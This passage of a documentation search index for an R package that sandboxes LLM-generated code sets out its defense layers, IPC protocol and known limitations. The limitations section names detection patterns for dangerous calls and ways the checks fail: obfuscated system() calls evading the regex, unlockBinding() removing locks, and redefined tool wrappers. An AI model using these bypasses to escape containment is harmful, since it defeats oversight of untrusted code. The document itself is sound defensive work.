level.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"macos-seatbelt-sandbox-exec","dir":"Articles","previous_headings":"Defense layers > Layer 1: OS-level sandbox","what":"macOS: Seatbelt (sandbox-exec)","title":"Security Model","text":"child R process runs inside sandbox-exec -f profile.sb. profile generated dynamically generate_seatbelt_profile() deny-default policy: Allowed operations: File reads: R installation (R.home()), R library paths (.libPaths()), system libraries (/usr, /Library/Frameworks, /System/Library, /opt/homebrew), device nodes (/dev), specific /etc files (localtime, ssl certs, hosts), temp directories (/tmp, /private/var/folders/), sandbox profile File writes: session-specific socket directory (/tmp/securer_XXXXX/), R’s per-user temp area (/private/var/folders/...), specific device nodes (/dev/null, /dev/tty, /dev/random, /dev/urandom) Network: Unix domain sockets (local IPC). remote IP traffic (TCP/UDP) explicitly denied Process execution: R binaries (R.home()/bin/), /bin/sh, /bin/bash, handful POSIX utilities needed R’s startup script (sed, uname, grep, dirname, basename, rm). interpreters (python, perl, ruby, node) blocked System: Mach IPC, sysctl, signals, IOKit, POSIX IPC (required R macOS internals) allowed: Writing user’s home directory Reading ~/.ssh, ~/.aws, ~/.config (paths allowed subpath, though note broad /usr reads allowed) Outbound HTTP/HTTPS connections Executing arbitrary binaries profile written temp file passed sandbox-exec -f. wrapper script injected via callr::r_session_options(arch = \"/path//wrapper.sh\"), callr treats direct path R binary.","code":"# The generated profile starts with: # (version 1) # (deny default)"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"linux-bubblewrap-bwrap","dir":"Articles","previous_headings":"Defense layers > Layer 1: OS-level sandbox","what":"Linux: bubblewrap (bwrap)","title":"Security Model","text":"child runs inside bwrap --unshare-, creates isolated PID, network, user, mount, UTS, IPC namespaces: Filesystem: root filesystem mounted. explicitly listed paths available. System libraries (/usr, /lib, /lib64, /bin, /sbin), config files (/etc/ld..cache, /etc/localtime, /etc/ssl, /etc/R), R installation bind-mounted read-. R library paths outside /usr R.home() also bind-mounted read-. /tmp clean tmpfs. socket directory bind-mounted writable top /tmp. Network: Completely isolated via --unshare-net. child network interfaces (even loopback configurations). Process isolation: Separate PID namespace. child sees PID 1. see signal host processes. HOME/TMPDIR: Set /tmp inside namespace. R_LIBS_USER set empty.","code":"# Key bwrap arguments: # --unshare-all        isolate all namespaces # --die-with-parent    kill child if parent dies # --new-session        new session ID (prevents terminal hijacking) # --ro-bind /usr /usr  read-only system libraries # --ro-bind R.home()   read-only R installation # --tmpfs /tmp         clean writable /tmp # --bind socket_dir    writable socket directory (overlays /tmp) # --proc /proc         minimal proc filesystem # --dev /dev           minimal dev nodes"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"windows-environment-isolation-job-objects","dir":"Articles","previous_headings":"Defense layers > Layer 1: OS-level sandbox","what":"Windows: environment isolation + Job Objects","title":"Security Model","text":"Windows lacks userspace sandboxing API equivalent Seatbelt bubblewrap. securer provides two weaker mechanisms: Environment isolation: child gets sanitized environment HOME, TMPDIR, TMP, TEMP pointing private temp directory, R_LIBS_USER set empty string. prevents child loading packages user’s personal library writing user’s home via HOME. Job Objects (resource limits ): resource limits specified, securer generates PowerShell script uses C# P/Invoke create Windows Job Object assign child process . Supported limits: ProcessMemoryLimit (memory limit) PerProcessUserTimeLimit (cpu limit, converted 100ns units) ActiveProcessLimit (nproc limit) Job Object also sets JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE child processes terminated job handle closes. Limits Job Object equivalent (fsize, nofile, stack) emit warning skipped. filesystem network restrictions applied Windows. child process can read write anywhere user account access, can make network connections.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-2-resource-limits","dir":"Articles","previous_headings":"Defense layers","what":"Layer 2: Resource limits","title":"Security Model","text":"Prevent resource exhaustion attacks. Applied via ulimit Unix Job Objects Windows. wrapper script sets soft hard limits (ulimit -S -H) exec-ing R, child raise : Resource limits can used independently sandbox (sandbox = FALSE, limits = list(cpu = 30)), case minimal wrapper script applies ulimit commands.","code":"# Default limits (applied automatically when sandbox = TRUE): default_limits() #> $cpu     60          # 60 seconds CPU time #> $memory  536870912   # 512 MB virtual memory #> $fsize   52428800    # 50 MB max file size #> $nproc   50          # 50 child processes #> $nofile  256         # 256 open file descriptors # Generated wrapper script (Unix): # #!/bin/sh # ulimit -S -H -t 60       # CPU seconds # ulimit -S -H -v 524288   # virtual memory in KB # ulimit -S -H -f 102400   # file size in 512-byte blocks # ulimit -S -H -u 50       # max processes # ulimit -S -H -n 256      # max open files # exec /usr/bin/sandbox-exec -f /tmp/securer_XXX.sb /path/to/R \"$@\""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-3-execution-timeouts","dir":"Articles","previous_headings":"Defense layers","what":"Layer 3: Execution timeouts","title":"Security Model","text":"Wall-clock deadline enforced parent’s event loop. Unlike ulimit -t (measures CPU time), catches cases child blocked /O sleeping: timeout: child process killed ($kill()) IPC connection cleaned socket sandbox temp files removed new session started automatically SecureSession object remains usable subsequent calls","code":"session$execute(\"Sys.sleep(3600)\", timeout = 10) #> Error: Execution timed out after 10 seconds"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-4-ipc-authentication","dir":"Articles","previous_headings":"Defense layers","what":"Layer 4: IPC authentication","title":"Security Model","text":"child process connects Unix domain socket, must present 32-character random token first message. parent generates token session creation passes child via SECURER_TOKEN environment variable. prevents another process connecting socket injecting tool calls. Combined 0700 directory permissions socket directory, current user can access socket.","code":"# Parent generates token: private$ipc_token <- paste0(   sample(c(letters, LETTERS, 0:9), 32, replace = TRUE),   collapse = \"\" )  # Child sends token as first message after connecting: # processx::conn_write(conn, paste0(Sys.getenv(\"SECURER_TOKEN\"), \"\\n\"))  # Parent validates: # if (!identical(auth_line, private$ipc_token)) #   stop(\"IPC authentication failed\")"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-5-ipc-message-validation","dir":"Articles","previous_headings":"Defense layers","what":"Layer 5: IPC message validation","title":"Security Model","text":"Every message child validated processing: Size limit: Messages larger 1 MB (configurable via private$max_ipc_message_size) rejected JSON parsing. prevents memory exhaustion via single oversized message. JSON structure: parsed message must JSON object (list). type field must scalar string. Tool call validation: type: \"tool_call\" messages, tool field must scalar string matching regex ^[-Za-z.][-Za-z0-9_.]*$ (valid R identifier). args field must list null. Tool name allowlist: tool name looked registered tool functions (private$tool_fns). Unknown tools return error child. Tool call rate limiting: $execute(code, max_tool_calls = N) caps number tool calls per execution. Exceeding limit raises error halts execution.","code":"session$execute(\"while(TRUE) add(1, 1)\", max_tool_calls = 100) #> Error: Maximum tool calls (100) exceeded"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-6-environment-sanitization","dir":"Articles","previous_headings":"Defense layers","what":"Layer 6: Environment sanitization","title":"Security Model","text":"child process inherits allowlisted set environment variables. others set NA (callr interprets “remove child environment”): Everything list removed. means: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY – inherited GITHUB_TOKEN, OPENAI_API_KEY – inherited DATABASE_URL, REDIS_URL – inherited custom SECRET_* API_* variables – inherited Two securer-specific variables added: SECURER_SOCKET (socket path) SECURER_TOKEN (authentication token).","code":"# Allowlisted variables: safe_vars <- c(   \"PATH\", \"HOME\", \"USER\", \"LOGNAME\", \"LANG\", \"LC_ALL\", \"LC_CTYPE\",   \"LC_MESSAGES\", \"LC_COLLATE\", \"LC_MONETARY\", \"LC_NUMERIC\", \"LC_TIME\",   \"SHELL\", \"TMPDIR\", \"TZ\", \"TERM\",   \"R_HOME\", \"R_LIBS\", \"R_LIBS_SITE\", \"R_LIBS_USER\",   \"R_PLATFORM\", \"R_ARCH\" )"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-7-tool-argument-validation","dir":"Articles","previous_headings":"Defense layers","what":"Layer 7: Tool argument validation","title":"Security Model","text":"Two layers argument validation, sides trust boundary: Parent-side (run_with_tools()): argument metadata exists called tool, argument names expected set rejected error sent back child. prevents child passing unexpected arguments tool functions. Child-side (generated wrapper functions): tool arguments type annotations (e.g., args = list(x = \"numeric\")), generated wrapper includes runtime type checks run IPC call:","code":"# Generated wrapper for a tool with typed args: add <- function(a, b) {   if (!is.numeric(a)) stop(\"Tool 'add': argument 'a' must be numeric, got \",                             class(a)[1], call. = FALSE)   if (!is.numeric(b)) stop(\"Tool 'add': argument 'b' must be numeric, got \",                             class(b)[1], call. = FALSE)   .securer_call_tool(\"add\", a = a, b = b) }"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-8-code-pre-validation","dir":"Articles","previous_headings":"Defense layers","what":"Layer 8: Code pre-validation","title":"Security Model","text":"sending code child, validate_code() performs two checks: Syntax check: parse(text = code) catches syntax errors immediately, avoiding round-trip child process. Dangerous pattern warnings: Regex-based detection calls system(), system2(), .Internal(), .Call(), dyn.load(), pipe(), processx::run(), callr::r(), socketConnection(), url(), .call(). warnings advisory . security boundary. regex matching produces false positives (\"system() function\" string) false negatives (indirect invocation via get(\"system\")()). OS-level sandbox actual enforcement layer.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-9-socket-directory-permissions","dir":"Articles","previous_headings":"Defense layers","what":"Layer 9: Socket directory permissions","title":"Security Model","text":"socket directory (/tmp/securer_XXXXX/) created mode 0700: owning user can list, read, write files directory. prevents users shared system connecting Unix domain socket. Combined authentication token (Layer 4), connection unauthorized process rejected even somehow obtains file descriptor socket.","code":"dir.create(private$socket_dir, mode = \"0700\")"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"layer-10-child-runtime-hardening","dir":"Articles","previous_headings":"Defense layers","what":"Layer 10: Child runtime hardening","title":"Security Model","text":"child runtime code injected, key bindings locked prevent child redefining : lockBinding() prevents reassignment via <- assign(). lockEnvironment() bindings = TRUE prevents modifying .securer_env$conn .securer_env$socket_path. means child code : Redefine .securer_call_tool() bypass argument validation Modify .securer_env$conn point different socket Replace .securer_connect() alter connection flow Note: Tool wrapper functions (e.g., add(), get_weather()) injected generate_tool_wrappers() locked. Child code can redefine , affects child’s calling convention. parent-side tool name allowlist argument validation still apply.","code":"# In child_runtime_code(): lockEnvironment(.securer_env, bindings = TRUE) lockBinding(\".securer_call_tool\", globalenv()) lockBinding(\".securer_connect\", globalenv()) lockBinding(\".securer_env\", globalenv())"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"what-the-sandbox-prevents","dir":"Articles","previous_headings":"","what":"What the sandbox prevents","title":"Security Model","text":"Concrete outcomes specific attack scenarios:","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"known-limitations","dir":"Articles","previous_headings":"","what":"Known limitations","title":"Security Model","text":"section documents gaps security model. design trade-offs, bugs, deployers understand .","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"windows-has-no-filesystem-or-network-restrictions","dir":"Articles","previous_headings":"Known limitations","what":"Windows has no filesystem or network restrictions","title":"Security Model","text":"Windows sandbox provides environment isolation Job Object resource limits. child process can read write file user account access , can make arbitrary network connections. Implementing filesystem network isolation Windows require AppContainer Windows Sandbox APIs, need compiled C/C++ code potentially elevated privileges. Mitigation: Windows, run host process inside Docker container Windows Sandbox provide missing isolation layers.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"macos-seatbelt-allows-broad-file-reads","dir":"Articles","previous_headings":"Known limitations","what":"macOS Seatbelt allows broad file reads","title":"Security Model","text":"R requires access system libraries, frameworks, shared objects runtime. Seatbelt profile allows file-read* /usr, /Library/Frameworks, /System/Library, /opt/homebrew, /bin, /dev. means child can read system files, though user’s home directory. Notably, file-read-metadata allowed globally (R needs stat() path resolution), means child can discover existence size file, even read contents. Mitigation: Sensitive data stored system-wide readable locations. environment sanitization (Layer 6) protects credentials stored environment variables.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"sandbox-exec-is-deprecated-by-apple","dir":"Articles","previous_headings":"Known limitations","what":"sandbox-exec is deprecated by Apple","title":"Security Model","text":"Apple deprecated sandbox-exec Seatbelt profile language. macOS 15 (Sequoia), still functions used Apple’s tools, removed future release public replacement third-party use. Mitigation: Monitor macOS release notes. sandbox-exec removed, fallback path emits warning runs without OS-level sandboxing (resource limits IPC validation still apply).","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"ulimit-is-per-process-not-per-session","dir":"Articles","previous_headings":"Known limitations","what":"ulimit is per-process, not per-session","title":"Security Model","text":"ulimit values apply individual process. child forks inherits limits, fork counts one process nproc limit. nproc limit also per-user, per-session, processes user count .","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"ipc-channel-is-not-encrypted","dir":"Articles","previous_headings":"Known limitations","what":"IPC channel is not encrypted","title":"Security Model","text":"Communication parent child uses plaintext JSON Unix domain socket. socket protected filesystem permissions (0700 directory) authentication token, data encrypted transit. compromised host attacker UID, potentially read IPC traffic. Mitigation: socket directory 0700 permissions random name. authentication token prevents unauthorized connections. host compromised UID level, attacker already access everything session can access.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"code-pre-validation-is-advisory-only","dir":"Articles","previous_headings":"Known limitations","what":"Code pre-validation is advisory only","title":"Security Model","text":"validate_code() function uses regex pattern matching, : Produces false positives: \"system() useful\" (string, call) triggers warning Produces false negatives: get(\"sys\" %p% \"tem\")() .call(\"system\",   list(\"ls\")) evade detection sandbox actual enforcement layer. Pre-validation convenience catching obvious mistakes, security boundary.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"tool-wrapper-functions-are-not-locked","dir":"Articles","previous_headings":"Known limitations","what":"Tool wrapper functions are not locked","title":"Security Model","text":".securer_call_tool(), .securer_connect(), .securer_env protected lockBinding(), generated tool wrapper functions (e.g., add(), get_weather()) locked. Child code redefine : affects child’s calling convention. parent-side argument validation tool function execution unaffected. child can already call .securer_call_tool() directly arguments, redefining wrapper provides additional capability.","code":"# Child code could do: add <- function(a, b) .securer_call_tool(\"add\", a = a * 1000, b = b)"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"session-pooling-multiplies-the-attack-surface","dir":"Articles","previous_headings":"Known limitations","what":"Session pooling multiplies the attack surface","title":"Security Model","text":"SecureSessionPool$new(size = 4) creates 4 independent child processes, UDS, sandbox config, resource limits. vulnerability sandbox affects pool members. Dead sessions auto-restarted acquire, means child crashes (e.g., hitting resource limit) gets replaced transparently.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"fallback-to-unsandboxed-execution","dir":"Articles","previous_headings":"Known limitations","what":"Fallback to unsandboxed execution","title":"Security Model","text":"platform-specific sandbox tool unavailable (sandbox-exec found macOS, bwrap found Linux), securer falls back running without OS-level sandboxing. warning emitted, execution proceeds. defense layers (resource limits, IPC validation, environment sanitization) still apply.","code":"# Warning message: # \"bwrap (bubblewrap) not found; falling back to unsandboxed session\""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"the-child-can-consume-resources-within-limits","dir":"Articles","previous_headings":"Known limitations","what":"The child can consume resources within limits","title":"Security Model","text":"Resource limits bound prevent resource use. child can still: Allocate 512 MB memory (default) Use 60 seconds CPU time (default) Write files 50 MB (default) Create 50 processes (default) defaults generous use case, pass tighter limits:","code":"session <- SecureSession$new(   sandbox = TRUE,   limits = list(cpu = 5, memory = 64 * 1024 * 1024, nproc = 5) )"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"lockbinding-can-be-bypassed-via-environments","dir":"Articles","previous_headings":"Known limitations","what":"lockBinding can be bypassed via environments","title":"Security Model","text":"R’s lockBinding() prevents <- assign() global environment, prevent forms modification. example, unlockBinding(\".securer_call_tool\", globalenv()) remove lock. However, lockEnvironment(.securer_env, bindings = TRUE) uses stronger mechanism unlocked .securer_env environment. practical impact low: even child redefines .securer_call_tool(), can change constructs IPC messages. parent validates messages independently.","code":""},{"path":[]},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"transport","dir":"Articles","previous_headings":"IPC protocol details","what":"Transport","title":"Security Model","text":"Socket type: Unix domain socket (AF_UNIX, SOCK_STREAM) Socket path: /tmp/securer_XXXXX/ipc.sock (Unix) %TEMP%\\securer_XXXXX\\ipc.sock (Windows) Path length: Uses /tmp directly stay ~104 character limit Unix domain socket paths macOS (tempdir() can deeply nested R CMD check) Direction: Bidirectional. Parent creates server, child connects. Library: processx::conn_create_unix_socket() / processx::conn_connect_unix_socket()","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"connection-lifecycle","dir":"Articles","previous_headings":"IPC protocol details","what":"Connection lifecycle","title":"Security Model","text":"Parent creates server socket /tmp/securer_XXXXX/ipc.sock Parent starts child process (via callr::r_session$new()) Child runtime code connects socket path SECURER_SOCKET env var Parent accepts connection (processx::conn_accept_unix_socket() – transitions server connection -place, return new object) Child sends authentication token (SECURER_TOKEN env var) Parent validates token; rejects mismatch","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"message-format","dir":"Articles","previous_headings":"IPC protocol details","what":"Message format","title":"Security Model","text":"Newline-delimited JSON. message single line terminated \\n. Tool call (child parent): Tool response (parent child): Tool error (parent child):","code":"{\"type\":\"tool_call\",\"tool\":\"add\",\"args\":{\"a\":1,\"b\":2}} {\"value\":3} {\"error\":\"Unknown tool: nonexistent\"}"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"flow","dir":"Articles","previous_headings":"IPC protocol details","what":"Flow","title":"Security Model","text":"protocol synchronous. child blocks socket read sending tool call. parent executes tool function full host privileges, writes result back. child resumes return value. multiplexing --order execution. tool call synchronous request/response pair.","code":"Child                           Parent   |                               |   |--- tool_call JSON ----------->|   |   (child blocks on read)      |-- validate message   |                               |-- validate tool name   |                               |-- validate arg names   |                               |-- execute tool fn   |<-- result JSON ---------------|   |   (child resumes)             |"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"timeout-behavior","dir":"Articles","previous_headings":"IPC protocol details","what":"Timeout behavior","title":"Security Model","text":"parent’s event loop polls UDS child process loop 200ms intervals. wall-clock deadline set, loop checks remaining time iteration. deadline expires, child killed, IPC connection torn , new session started.","code":""},{"path":[]},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"always-use-sandbox-true-in-production","dir":"Articles","previous_headings":"Recommendations for deployers","what":"Always use sandbox = TRUE in production","title":"Security Model","text":"Without sandbox, child process privileges parent. includes full filesystem access, network access, process execution.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"set-explicit-resource-limits","dir":"Articles","previous_headings":"Recommendations for deployers","what":"Set explicit resource limits","title":"Security Model","text":"Even sandbox enabled, set limits appropriate workload: defaults (60s CPU, 512 MB memory, 50 MB file, 50 processes, 256 files) intentionally generous avoid breaking legitimate workloads. Tighten based LLM-generated code actually needs.","code":"session <- SecureSession$new(   sandbox = TRUE,   limits = list(     cpu = 10,                      # 10 seconds CPU     memory = 128 * 1024 * 1024,    # 128 MB     fsize = 10 * 1024 * 1024,      # 10 MB max file     nproc = 10,                    # 10 processes     nofile = 64                    # 64 open files   ) )"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"use-execution-timeouts","dir":"Articles","previous_headings":"Recommendations for deployers","what":"Use execution timeouts","title":"Security Model","text":"Always pass timeout $execute(): catches cases ulimit -t apply (e.g., child blocked /O, sleeping, waiting lock).","code":"session$execute(llm_code, timeout = 30)"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"use-max_tool_calls-to-prevent-loops","dir":"Articles","previous_headings":"Recommendations for deployers","what":"Use max_tool_calls to prevent loops","title":"Security Model","text":"LLM generates code calls tool tight loop, can overwhelm host. Set cap:","code":"session$execute(llm_code, timeout = 30, max_tool_calls = 50)"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"review-tool-functions-carefully","dir":"Articles","previous_headings":"Recommendations for deployers","what":"Review tool functions carefully","title":"Security Model","text":"Tool functions execute host full privileges. tool runs arbitrary SQL, writes arbitrary paths, makes unconstrained API calls undermines sandbox. Apply principle least privilege tool:","code":"# BAD: arbitrary SQL securer_tool(\"query\", \"Run SQL\",   fn = function(sql) DBI::dbGetQuery(conn, sql),   args = list(sql = \"character\"))  # BETTER: parameterized query with allowlist securer_tool(\"get_user\", \"Look up user by ID\",   fn = function(user_id) {     stopifnot(is.numeric(user_id), user_id > 0)     DBI::dbGetQuery(conn, \"SELECT name, email FROM users WHERE id = ?\",                     params = list(user_id))   },   args = list(user_id = \"numeric\"))"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"enable-audit-logging","dir":"Articles","previous_headings":"Recommendations for deployers","what":"Enable audit logging","title":"Security Model","text":"compliance incident investigation, enable file-based audit log: entry JSON object timestamp, event type, session ID: Events logged: session_start, session_close, execute_start, execute_complete, execute_error, execute_timeout, tool_call, tool_result.","code":"session <- SecureSession$new(   sandbox = TRUE,   audit_log = \"/var/log/securer/audit.jsonl\" ) {\"timestamp\":\"2025-01-15T10:30:00.123Z\",\"event\":\"tool_call\",\"session_id\":\"sess_abc123\",\"tool\":\"add\",\"args\":{\"a\":1,\"b\":2}}"},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"on-windows-use-container-isolation","dir":"Articles","previous_headings":"Recommendations for deployers","what":"On Windows, use container isolation","title":"Security Model","text":"Since Windows sandbox restrict filesystem network access, run host process inside Docker container (Windows containers) WSL2 bwrap get missing isolation layers.","code":""},{"path":"https://ian-flores.github.io/securer/articles/security-model.html","id":"monitor-for-sandbox-fallback-warnings","dir":"Articles","previous_headings":"Recommendations for deployers","what":"Monitor for sandbox fallback warnings","title":"Security Model","text":"sandbox-exec bwrap installed, securer falls back unsandboxed execution warning. production, treat warning deployment error. Ensure sandbox tools installed PATH starting sessions.","code":"# Verify sandbox tooling is available: if (Sys.info()[[\"sysname\"]] == \"Linux\") {   stopifnot(nzchar(Sys.which(\"bwrap\"))) } if (Sys.info()[[\"sysname\"]] == \"Darwin\") {   stopifnot(file.exists(\"/usr/bin/sandbox-exec\")) }"},{"path":"https://ian-flores.github.io/securer/authors.html","id":null,"dir":"","previous_headings":"","what":"Authors","title":"Authors and Citation","text":"Ian Flores Siaca. Author, maintainer.","code":""},{"path":"https://ian-flores.github.io/securer/authors.html","id":"citation","dir":"","previous_headings":"","what":"Citation","title":"Authors and Citation","text":"Flores Siaca (2026). securer: Secure R Code Execution Tool-Call IPC. R package version 0.1.0, https://ian-flores.github.io/securer/.","code":"@Manual{,   title = {securer: Secure R Code Execution with Tool-Call IPC},   author = {Ian {Flores Siaca}},   year = {2026},   note = {R package version 0.1.0},   url = {https://ian-flores.github.io/securer/}, }"},{"path":"https://ian-flores.github.io/securer/index.html","id":"securer","dir":"","previous_headings":"","what":"Secure R Code Execution with Tool-Call IPC","title":"Secure R Code Execution with Tool-Call IPC","text":"[!NOTE] Beta release (0.1.0). core API stabilizing may still change. Feedback bug reports welcome GitHub Issues. Let LLMs write R code calls functions — safely. LLM generates R code, need two things: way code call back application (tool calls), confidence code can’t anything dangerous (sandboxing). securer provides . child R process sandboxed OS level. Tool functions execute host side, outside sandbox, full access resources. LLM’s code never touches filesystem, network, data directly.","code":"library(securer)  # Your functions become tools the LLM's code can call tools <- list(   securer_tool(\"query_db\", \"Query a database table\",     fn = function(table, limit) head(get(table, \"package:datasets\"), limit),     args = list(table = \"character\", limit = \"numeric\")) )  # LLM-generated code runs sandboxed — tool calls pause, execute on your side, resume result <- execute_r('   data <- query_db(\"mtcars\", 5)   mean(data$mpg) ', tools = tools, sandbox = TRUE)"},{"path":"https://ian-flores.github.io/securer/index.html","id":"installation","dir":"","previous_headings":"","what":"Installation","title":"Secure R Code Execution with Tool-Call IPC","text":"","code":"# install.packages(\"pak\") pak::pak(\"ian-flores/securer\")"},{"path":[]},{"path":"https://ian-flores.github.io/securer/index.html","id":"how-it-works","dir":"","previous_headings":"","what":"How It Works","title":"Secure R Code Execution with Tool-Call IPC","text":"Communication happens Unix domain socket. Tool calls synchronous: child blocks parent fulfills request.","code":"┌──────────────────────┐        ┌──────────────────────┐ │    Parent (host)      │        │  Child (sandboxed R)  │ │                       │        │                       │ │  1. Send code ────────┼───────>│  2. eval(code)        │ │                       │  UDS   │                       │ │  3. Execute tool  <───┼────────│  Code calls tool()    │ │     (your function)   │        │  → pauses on socket   │ │                       │        │                       │ │  4. Send result ──────┼───────>│  5. Resumes with      │ │                       │        │     tool result       │ │                       │        │                       │ │  6. Receive final <───┼────────│  Returns final value  │ │     result            │        │                       │ └──────────────────────┘        └──────────────────────┘"},{"path":[]},{"path":"https://ian-flores.github.io/securer/index.html","id":"persistent-sessions","dir":"","previous_headings":"Features","what":"Persistent Sessions","title":"Secure R Code Execution with Tool-Call IPC","text":"Reuse session across multiple executions avoid startup overhead:","code":"session <- SecureSession$new(tools = tools, sandbox = TRUE)  session$execute('query_db(\"iris\", 3)') session$execute('query_db(\"mtcars\", 5)')  session$close()"},{"path":"https://ian-flores.github.io/securer/index.html","id":"session-pooling","dir":"","previous_headings":"Features","what":"Session Pooling","title":"Secure R Code Execution with Tool-Call IPC","text":"Pre-warm multiple sessions low-latency concurrent execution:","code":"pool <- SecureSessionPool$new(size = 4, tools = tools, sandbox = TRUE)  result <- pool$execute('query_db(\"iris\", 3)')  pool$close()"},{"path":"https://ian-flores.github.io/securer/index.html","id":"resource-limits","dir":"","previous_headings":"Features","what":"Resource Limits","title":"Secure R Code Execution with Tool-Call IPC","text":"Constrain CPU, memory, file size, . Works without sandbox mode platforms:","code":"result <- execute_r(\"1 + 1\",   limits = list(cpu = 10, memory = 256 * 1024 * 1024) )"},{"path":"https://ian-flores.github.io/securer/index.html","id":"execution-timeouts","dir":"","previous_headings":"Features","what":"Execution Timeouts","title":"Secure R Code Execution with Tool-Call IPC","text":"Kill long-running code automatically. session recovers reusable:","code":"session <- SecureSession$new() session$execute(\"Sys.sleep(100)\", timeout = 5) # Error: Execution timed out after 5 seconds session$execute(\"1 + 1\")  # still works"},{"path":"https://ian-flores.github.io/securer/index.html","id":"code-pre-validation","dir":"","previous_headings":"Features","what":"Code Pre-Validation","title":"Secure R Code Execution with Tool-Call IPC","text":"Catch syntax errors sending code child process:","code":"session$execute(\"if (TRUE {\")  # immediate error, no child round-trip"},{"path":"https://ian-flores.github.io/securer/index.html","id":"ellmer-integration","dir":"","previous_headings":"Features","what":"ellmer Integration","title":"Secure R Code Execution with Tool-Call IPC","text":"Use securer code execution tool ellmer LLM chats:","code":"library(ellmer) chat <- chat_openai() chat$register_tool(securer_as_ellmer_tool()) chat$chat(\"Calculate the mean of 1 through 100 using R\")"},{"path":"https://ian-flores.github.io/securer/index.html","id":"audit-logging","dir":"","previous_headings":"Features","what":"Audit Logging","title":"Secure R Code Execution with Tool-Call IPC","text":"Write structured JSONL logs session events compliance debugging:","code":"session <- SecureSession$new(audit_log = \"session.jsonl\")"},{"path":"https://ian-flores.github.io/securer/index.html","id":"verbose-logging","dir":"","previous_headings":"Features","what":"Verbose Logging","title":"Secure R Code Execution with Tool-Call IPC","text":"Debug session behavior human-readable message() output:","code":"session <- SecureSession$new(verbose = TRUE) # [securer] Session started (sandbox=FALSE, pid=1234) # [securer] Tool call: query_db(table=\"iris\", limit=3) # [securer] Execution complete (0.5s)"},{"path":"https://ian-flores.github.io/securer/index.html","id":"platform-support","dir":"","previous_headings":"","what":"Platform Support","title":"Secure R Code Execution with Tool-Call IPC","text":"Linux macOS provide full OS-level sandboxing including network filesystem restrictions. Windows provides environment isolation resource limits via Job Objects (memory, CPU time, active process count). platforms support tool call IPC, execution timeouts, code pre-validation.","code":""},{"path":"https://ian-flores.github.io/securer/index.html","id":"security","dir":"","previous_headings":"","what":"Security","title":"Secure R Code Execution with Tool-Call IPC","text":"securer implements defense--depth multiple layers: OS-level sandboxing, authenticated IPC, resource limits, environment sanitization, input validation. detailed threat model security architecture, see vignette(\"security-model\", package = \"securer\"). report security vulnerabilities, please email maintainer directly rather filing public issue.","code":""},{"path":"https://ian-flores.github.io/securer/index.html","id":"documentation","dir":"","previous_headings":"","what":"Documentation","title":"Secure R Code Execution with Tool-Call IPC","text":"vignette(\"getting-started\", package = \"securer\") — full walkthrough vignette(\"security-model\", package = \"securer\") — security architecture threat model pkgdown site — API reference","code":""},{"path":"https://ian-flores.github.io/securer/index.html","id":"license","dir":"","previous_headings":"","what":"License","title":"Secure R Code Execution with Tool-Call IPC","text":"MIT","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":null,"dir":"Reference","previous_headings":"","what":"SecureSession — SecureSession","title":"SecureSession — SecureSession","text":"R6 class secure code execution tool-call IPC. Wraps callr::r_session bidirectional Unix domain socket protocol allows code running child process pause, call tools parent side, resume result.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"SecureSession — SecureSession","text":"R6 object class SecureSession.","code":""},{"path":[]},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"public-methods","dir":"Reference","previous_headings":"","what":"Public methods","title":"SecureSession — SecureSession","text":"SecureSession$new() SecureSession$execute() SecureSession$close() SecureSession$is_alive() SecureSession$format() SecureSession$print() SecureSession$tools() SecureSession$restart() SecureSession$clone()","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-new-","dir":"Reference","previous_headings":"","what":"Method new()","title":"SecureSession — SecureSession","text":"Create new SecureSession","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$new(   tools = list(),   sandbox = FALSE,   limits = NULL,   verbose = FALSE,   sandbox_strict = FALSE,   audit_log = NULL 